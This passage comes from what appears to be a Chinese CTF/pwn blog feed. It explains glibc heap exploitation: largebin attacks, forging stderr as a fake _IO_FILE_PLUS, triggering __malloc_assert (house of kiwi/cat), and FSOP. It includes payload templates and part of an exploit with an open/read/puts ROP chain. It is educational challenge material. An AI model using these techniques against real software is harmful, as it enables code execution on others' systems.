    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_setbuf_t</span><span class="p">,</span> <span class="n">__setbuf</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_sync_t</span><span class="p">,</span> <span class="n">__sync</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_doallocate_t</span><span class="p">,</span> <span class="n">__doallocate</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_read_t</span><span class="p">,</span> <span class="n">__read</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_write_t</span><span class="p">,</span> <span class="n">__write</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seek_t</span><span class="p">,</span> <span class="n">__seek</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_close_t</span><span class="p">,</span> <span class="n">__close</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_stat_t</span><span class="p">,</span> <span class="n">__stat</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_showmanyc_t</span><span class="p">,</span> <span class="n">__showmanyc</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_imbue_t</span><span class="p">,</span> <span class="n">__imbue</span><span class="p">);</span>
<span class="c">#if 0
    get_column;
    set_column;
#endif
</span><span class="p">};</span>
</code></pre></div></div> <h5 id="对于__malloc_assert的触发方法-我们需要伪造stderr结构体-以下是一个通用的模板httpsbbskanxuecomthread-273895htmmsg_header_h3_5">   对于__malloc_assert的触发方法, 我们需要伪造stderr结构体, 以下是一个通用的模板(https://bbs.kanxue.com/thread-273895.htm#msg_header_h3_5)</h5> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">fake_io_addr</span><span class="o">=</span><span class="n">heapbase</span><span class="o">+</span><span class="mh">0xb00</span> <span class="c1"># 伪造的fake_IO结构体的地址
</span><span class="n">next_chain</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">fake_IO_FILE</span><span class="o">=</span><span class="nf">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span>         <span class="c1">#_flags=rdi
</span><span class="n">fake_IO_FILE</span><span class="o">+=</span><span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">7</span>
<span class="n">fake_IO_FILE</span> <span class="o">+=</span><span class="nf">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">fake_IO_FILE</span> <span class="o">+=</span><span class="nf">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1">#_IO_saveup_base rcx!=0(FSOP)
</span><span class="n">fake_IO_FILE</span> <span class="o">+=</span><span class="nf">p64</span><span class="p">(</span><span class="n">fake_io_addr</span><span class="o">+</span><span class="mh">0xb0</span><span class="p">)</span><span class="c1">#_IO_backup_base=rdx
</span><span class="n">fake_IO_FILE</span> <span class="o">+=</span><span class="nf">p64</span><span class="p">(</span><span class="n">call_addr</span><span class="p">)</span><span class="c1">#_IO_save_end=call addr(call setcontext/system)
</span><span class="n">fake_IO_FILE</span> <span class="o">=</span> <span class="n">fake_IO_FILE</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
<span class="n">fake_IO_FILE</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># _chain
</span><span class="n">fake_IO_FILE</span> <span class="o">=</span> <span class="n">fake_IO_FILE</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0x88</span><span class="p">,</span> <span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
<span class="n">fake_IO_FILE</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">heapbase</span><span class="o">+</span><span class="mh">0x1000</span><span class="p">)</span>  <span class="c1"># _lock = a writable address
</span><span class="n">fake_IO_FILE</span> <span class="o">=</span> <span class="n">fake_IO_FILE</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">,</span> <span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
<span class="n">fake_IO_FILE</span> <span class="o">+=</span><span class="nf">p64</span><span class="p">(</span><span class="n">fake_io_addr</span><span class="o">+</span><span class="mh">0x30</span><span class="p">)</span><span class="c1">#_wide_data,rax1_addr
</span><span class="n">fake_IO_FILE</span> <span class="o">=</span> <span class="n">fake_IO_FILE</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0xc0</span><span class="p">,</span> <span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
<span class="n">fake_IO_FILE</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#mode=1
</span><span class="n">fake_IO_FILE</span> <span class="o">=</span> <span class="n">fake_IO_FILE</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0xd8</span><span class="p">,</span> <span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
<span class="n">fake_IO_FILE</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">libcbase</span><span class="o">+</span><span class="mh">0x2160c0</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span>  <span class="c1"># vtable=IO_wfile_jumps+0x10
</span><span class="n">fake_IO_FILE</span> <span class="o">+=</span><span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">6</span>
<span class="n">fake_IO_FILE</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">fake_io_addr</span><span class="o">+</span><span class="mh">0x40</span><span class="p">)</span>  <span class="c1"># rax2_addr
</span></code></pre></div></div> <h5 id="更加具体的模板-来自httpsxzaliyuncomt13016time__1311gqmhbkykgiqgx0hq1dunfg8ywpvdpyd">   更加具体的模板, 来自https://xz.aliyun.com/t/13016?time__1311=GqmhBKYKGIqGx0HQ1DunFG8YwpVDpYD</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">fake_struct</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                    <span class="err">#</span><span class="n">_IO_read_end</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_IO_read_base</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_IO_write_base</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_IO_write_ptr</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_IO_write_end</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_IO_buf_base</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_IO_buf_end</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_IO_save_base</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_io_addr</span> <span class="o">+</span> <span class="mh">0xb0</span><span class="p">)</span> <span class="err">#</span><span class="n">_IO_backup_base</span> <span class="o">=</span> <span class="n">rdx</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">call_addr</span><span class="p">)</span>           <span class="err">#</span><span class="n">_IO_save_end</span> <span class="o">=</span> <span class="n">call_addr</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_markers</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_chain</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_fileno</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_old_offset</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_cur_column</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x200</span><span class="p">)</span>   <span class="err">#</span><span class="n">_lock</span> <span class="o">=</span> <span class="n">heap_addr</span> <span class="n">or</span> <span class="n">writeable</span> <span class="n">libc_addr</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_offset</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_codecvx</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_io_addr</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">)</span> <span class="err">#</span><span class="n">_wide_data</span> <span class="n">rax1</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_freers_list</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_freers_buf</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">__pad5</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_mode</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">*</span><span class="mi">20</span>               <span class="err">#</span><span class="n">_unused2</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">_IO_wfile_jumps</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span> <span class="err">#</span><span class="n">vtable</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">6</span>                 <span class="err">#</span><span class="n">padding</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_io_addr</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">)</span> <span class="err">#</span><span class="n">rax2</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">fake_struct</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">7</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">rop_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
</code></pre></div></div> <h5 id="在具体使用时-需要更改fake_io_addr为伪造的fake_io的堆的地址-_io_save_end为要调用的函数即call_addr-_io_backup_base为执行函数时的rdx-以及修改_flags即rdi为执行函数时的rdi">   在具体使用时, 需要更改<code class="language-plaintext highlighter-rouge">fake_io_addr</code>为伪造的fake_IO的堆的地址, _IO_save_end为要调用的函数(即call_addr), _IO_backup_base为执行函数时的rdx, 以及修改_flags(即rdi)为执行函数时的rdi<br/></h5> <h5>   </h5> <h4 id="-__malloc_assert举例">  __malloc_assert举例</h4> <h5 id="这里以那道著名的-house-of-cat-举例-但是只关注largebin的部分-绕过沙箱的部分忽略-使用了__malloc_assert触发orw的方法">   这里以那道著名的 <code class="language-plaintext highlighter-rouge">house of cat</code> 举例, 但是只关注largebin的部分, 绕过沙箱的部分忽略.<br/>    使用了<code class="language-plaintext highlighter-rouge">__malloc_assert</code>触发orw的方法<br/>   </h5> <h5 id="第一步是要先泄露出libc和heap基址-这部分省略-请各显神通">   第一步是要先泄露出libc和heap基址, 这部分省略, 请各显神通<br/></h5> <h5 id="第二步是伪造一个_io_file_plus结构-用于绕过检查以及劫持虚表">   第二步是伪造一个_IO_FILE_PLUS结构, 用于绕过检查以及劫持虚表<br/></h5> <h5 id="第三步是通过largebin-attack将stderr使用伪造的结构体替换-">   第三步是通过largebin attack将stderr使用伪造的结构体替换, <br/></h5> <h5 id="第四步-弄一个rop或者是orw之类的-和二三步顺序可以互换">   第四步, 弄一个ROP或者是ORW之类的, 和二三步顺序可以互换<br/></h5> <h5 id="第五步-想办法触发__malloc_assert-常用的办法是修改top-chunk-size">   第五步, 想办法触发__malloc_assert, 常用的办法是修改top chunk size<br/></h5> <h5 id="模板中的call_addr修改为setcontext61-并在rop_addr指示的堆地址填入需要的rop链">   模板中的<code class="language-plaintext highlighter-rouge">call_addr</code>修改为<code class="language-plaintext highlighter-rouge">setcontext+61</code>, 并在<code class="language-plaintext highlighter-rouge">rop_addr</code>指示的堆地址填入需要的rop链</h5> <h5 id="完整exp可以看httpsxzaliyuncomt13016time__1311gqmhbkykgiqgx0hq1dunfg8ywpvdpyd-这里对伪造的部分做更具体地解释">   完整exp可以看https://xz.aliyun.com/t/13016?time__1311=GqmhBKYKGIqGx0HQ1DunFG8YwpVDpYD, 这里对伪造的部分做更具体地解释<br/></h5> <h5 id="-1">   </h5> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="bp">...</span>
<span class="nf">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># fwd
</span><span class="bp">...</span>
<span class="c1"># fake io struct
</span><span class="n">payload</span> <span class="o">=</span> <span class="n">fake_struct</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">7</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rop_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>

<span class="nf">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1"># addr(2) = addr(4) , 疑似是为了方便计算偏移
</span><span class="nf">add</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="mh">0x418</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span> 
<span class="nf">free</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="c1"># victim
</span>
<span class="c1"># largebin attack(fake stderr struct)
</span><span class="nf">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nf">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x21a0d0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x290</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">stderr</span><span class="o">-</span><span class="mh">0x20</span><span class="p">))</span>

<span class="c1"># 触发第一次largebin attack(add(5)), 同时为后面一次分配堆(add(5), add(7))
</span><span class="nf">add</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="mh">0x440</span><span class="p">,</span><span class="sh">"</span><span class="s">55555</span><span class="sh">"</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="mh">0x430</span><span class="p">,</span><span class="sh">"</span><span class="s">./flag</span><span class="sh">"</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span><span class="mh">0x430</span><span class="p">,</span><span class="sh">"</span><span class="s">77777</span><span class="sh">"</span><span class="p">)</span>

<span class="n">rop</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">close</span><span class="p">)</span> <span class="c1">#close(0)
</span><span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span> <span class="c1">#open(flag)
</span><span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdx_r12</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span> <span class="c1">#read(0,flag_addr+0x10,0x100)
</span><span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">puts</span><span class="p">)</span> <span class="c1">#puts(flag_addr+0x10)
</span>
<span class="c1"># 第二次largebin attack
</span><span class="nf">add</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="mh">0x430</span><span class="p">,</span><span class="n">rop</span><span class="p">)</span> <span class="c1"># +0x2040 +0x2050
</span><span class="nf">free</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span><span class="mh">0x450</span><span class="p">,</span><span class="sh">"</span><span class="s">9999</span><span class="sh">"</span><span class="p">)</span>
<span class="nf">free</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
<span class="nf">edit</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="nf">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x21a0e0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x1370</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x28e0</span><span class="o">-</span><span class="mh">0x20</span> <span class="o">+</span> <span class="mi">3</span><span class="p">))</span>
</code></pre></div></div> <h5 id="有几点细节需要注意">   有几点细节需要注意.<br/></h5> <h5 id="第一-这套基于__malloc_assert的打法在现在更高版本的glibc中已经不复存在了-因为__malloc_assert被删除了-但是largebin-attack的其他方法-比如fsop依然可以">   第一, 这套基于<code class="language-plaintext highlighter-rouge">__malloc_assert</code>的打法在现在更高版本的glibc中已经不复存在了, 因为<code class="language-plaintext highlighter-rouge">__malloc_assert</code>被删除了, 但是largebin attack的其他方法, 比如FSOP依然可以<br/></h5> <h5 id="第二-stderr结构体指针有时不在libc中-而是在bss段中-出现这种情况一般是使用了setvbuf-而不是setbuf或者不使用-这是因为setvbuf会在源文件中使用三个extern变量指针-在链接时被ld放入bss段-而setbuf使用的三个指针放在got内作为外部链接">   第二, stderr结构体指针有时不在libc中, 而是在<code class="language-plaintext highlighter-rouge">.bss</code>段中. 出现这种情况一般是使用了<code class="language-plaintext highlighter-rouge">setvbuf()</code>, 而不是<code class="language-plaintext highlighter-rouge">setbuf()</code>或者不使用. 这是因为<code class="language-plaintext highlighter-rouge">setvbuf()</code>会在源文件中使用三个<code class="language-plaintext highlighter-rouge">extern</code>变量指针, 在链接时被ld放入<code class="language-plaintext highlighter-rouge">.bss</code>段; 而<code class="language-plaintext highlighter-rouge">setbuf()</code>使用的三个指针放在<code class="language-plaintext highlighter-rouge">.got</code>内作为外部链接<br/></h5> <h5 id="第三-由于largebin-attack写入的是chunk-head的地址-再加上前4个字长的large-bin的信息-所以导致将这个堆块看作一个io_file_plus时-它的_flag前8字节-以及_io_read_ptr-_io_read_end-_io_read_base-_io_write_base-_io_write_ptr各八个字节实际上是难以控制的-除非有heap-overflow或者uaf之类漏洞-但是即使这样也不会影响这种攻击方法的使用">   第三, 由于largebin attack写入的是chunk head的地址, 再加上前4个字长的large bin的信息, 所以导致将这个堆块看作一个IO_FILE_PLUS时, 它的_flag(前8字节), 以及_IO_read_ptr, _IO_read_end, _IO_read_base, _IO_write_base, _IO_write_ptr(各八个字节)实际上是难以控制的, 除非有heap overflow或者UAF之类漏洞, <em>但是即使这样也不会影响这种攻击方法的使用</em>.</h5> <h3 id="fsop"> FSOP</h3> <h5 id="一个比较古老的漏洞但是进入虚表偏移时代之后fsop的形式出现了一些不同">   一个比较古老的漏洞，但是进入“虚表偏移时代”之后FSOP的形式出现了一些不同<br/></h5> <h5 id="fsop利用的两个部分第一是它的调用链第二是触发fsop">   FSOP利用的两个部分，第一是它的调用链，第二是触发FSOP</h5> <h4 id="触发io"> 触发IO</h4> <h5 id="在伪造了相应结构之后-想要进行fsop-让伪造数据被用上-需要先进入io流-在高版本的glibc中-一般有两种方式进入io流-_io_flush_all_lockp-以及house-of-kiwi方法-house-of-kiwi方法就是上面的__malloc_assert方法">   在伪造了相应结构之后, 想要进行FSOP, 让伪造数据被用上, 需要先进入IO流, 在高版本的glibc中, 一般有两种方式进入IO流: <code class="language-plaintext highlighter-rouge">_IO_flush_all_lockp()</code>, 以及<code class="language-plaintext highlighter-rouge">house of kiwi</code>方法, <code class="language-plaintext highlighter-rouge">house of kiwi</code>方法就是上面的<code class="language-plaintext highlighter-rouge">__malloc_assert</code>方法.</h5> <h4 id="_io_flush_all_lockp方法"> _IO_flush_all_lockp()方法</h4> <h5 id="这种方法是fsop的传统做法-_io_flush_all_lockp会从_io_list_all查找io_file结构体-然后分别对每个结构体flush-这个过程中会使用虚表中的_io_overflow">   这种方法是FSOP的传统做法, <code class="language-plaintext highlighter-rouge">_IO_flush_all_lockp()</code>会从<code class="language-plaintext highlighter-rouge">_IO_list_all</code>查找<code class="language-plaintext highlighter-rouge">IO_FILE</code>结构体, 然后分别对每个结构体flush, 这个过程中会使用虚表中的<code class="language-plaintext highlighter-rouge">_IO_overflow</code><br/></h5> <h5 id="触发这个函数又有一些办法-但是在高版本glibc中砍得七七八八-基本只剩下程序使用exit退出这一种比较常见又方便利用的方法">   触发这个函数又有一些办法, 但是在高版本glibc中砍得七七八八, 基本只剩下程序使用<code class="language-plaintext highlighter-rouge">exit()</code>退出这一种比较常见又方便利用的方法<br/></h5> <h5 id="精简代码">   精简代码</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">_IO_flush_all_lockp</span> <span class="p">(</span><span class="kt">int</span> <span class="n">do_lock</span><span class="p">){</span>
  <span class="p">...</span>
  <span class="n">fp</span> <span class="o">=</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="p">)</span> <span class="n">_IO_list_all</span><span class="p">;</span>
  <span class="k">while</span> <span class="p">(</span><span class="n">fp</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
  <span class="p">{</span>
       <span class="p">...</span>
    <span class="k">if</span> <span class="p">(((</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>
<span class="cp">#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
</span>       <span class="o">||</span> <span class="p">(</span><span class="n">_IO_vtable_offset</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
           <span class="o">&amp;&amp;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span>
                    <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">))</span>
<span class="cp">#endif
</span>       <span class="p">)</span>
      <span class="o">&amp;&amp;</span> <span class="n">_IO_OVERFLOW</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">EOF</span><span class="p">)</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
           <span class="p">{</span>
               <span class="n">result</span> <span class="o">=</span> <span class="n">EOF</span><span class="p">;</span>
          <span class="p">}</span>
        <span class="p">...</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="其中_io_overflow会使用虚表中0x18处的函数-这就给我们可乘之机">   其中<code class="language-plaintext highlighter-rouge">_IO_OVERFLOW</code>会使用虚表中<code class="language-plaintext highlighter-rouge">0x18</code>处的函数, 这就给我们可乘之机<br/></h5> <h5 id="为了避免短路-想要执行到_io_overflow-有两种选择条件">   为了避免短路, 想要执行到<code class="language-plaintext highlighter-rouge">_IO_OVERFLOW</code>, 有两种选择条件:</h5> <h5 id="第一种">   第一种:</h5> <h5 id="1-fp-_mode--0">    1. <code class="language-plaintext highlighter-rouge">fp-&gt;_mode &lt;= 0</code></h5> <h5 id="2-fp-_io_write_ptr--fp-_io_write_base">    2. <code class="language-plaintext highlighter-rouge">fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></h5> <h5 id="第二种">   第二种:</h5> <h5 id="1_io_vtable_offsetfp--0">    1.<code class="language-plaintext highlighter-rouge">_IO_vtable_offset(fp) == 0</code></h5> <h5 id="2fp-_mode--0">    2.<code class="language-plaintext highlighter-rouge">fp-&gt;_mode &gt; 0</code></h5> <h5 id="3-fp-_wide_data-_io_write_ptr--fp-_wide_data-_io_write_base">    3. <code class="language-plaintext highlighter-rouge">fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code></h5> <h5 id="但是在使用largebin-attack的情况下-第一种情况很难满足-因为_io_write_ptr和_io_write_base在chunk中的位置是fd_nextsize和bk_nextsize的位置">   但是在使用largebin attack的情况下, 第一种情况很难满足, 因为<code class="language-plaintext highlighter-rouge">_IO_write_ptr</code>和<code class="language-plaintext highlighter-rouge">_IO_write_base</code>在chunk中的位置是fd_nextsize和bk_nextsize的位置.<br/></h5> <h5 id="所以一般是第二种实现起来更方便">   所以一般是第二种实现起来更方便<br/></h5> <h5 id="至于之前使用的模板-只需要把伪造的vtable--0x10-改成-vtabel--0x30即可">   至于之前使用的模板, 只需要把伪造的<code class="language-plaintext highlighter-rouge">vtable + 0x10</code> 改成 <code class="language-plaintext highlighter-rouge">vtabel + 0x30</code>即可<br/></h5>]]></content><author><name>久菜合子</name></author><category term="pwn"/><category term="CTF"/><summary type="html"><![CDATA[ 好不容易学点东西赶紧记下来, 不然过几天又忘记了]]></summary></entry><entry><title type="html">[水贴]记一次离谱报错</title><link href="https://leakbox258.github.io/blog/2024/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BB%E8%B0%B1%E7%9A%84%E6%8A%A5%E9%94%99/" rel="alternate" type="text/html" 